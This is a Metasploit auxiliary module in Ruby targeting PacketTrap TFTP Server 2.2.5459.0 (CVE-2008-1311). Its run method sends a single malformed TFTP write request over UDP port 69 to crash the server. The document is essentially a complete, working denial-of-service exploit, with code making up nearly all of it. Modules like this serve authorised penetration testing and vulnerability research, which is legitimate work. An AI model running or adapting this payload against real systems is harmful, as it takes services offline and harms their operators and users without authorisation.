##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PacketTrap TFTP Server 2.2.5459.0 DoS',
      'Description'    => %q{
        The PacketTrap TFTP server version 2.2.5459.0 can be
        brought down by sending a special write request.
      },
      'Author'         => 'kris katterjohn',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-1311'],
          [ 'OSVDB', '42932'],
          [ 'EDB', '6863']
        ],
      'DisclosureDate' => 'Oct 29 2008'))

    register_options([Opt::RPORT(69)])
  end

  def run
    connect_udp
    print_status("Sending write request...")
    udp_sock.put("\x00\x02|\x00netascii\x00")
    disconnect_udp
  end
end
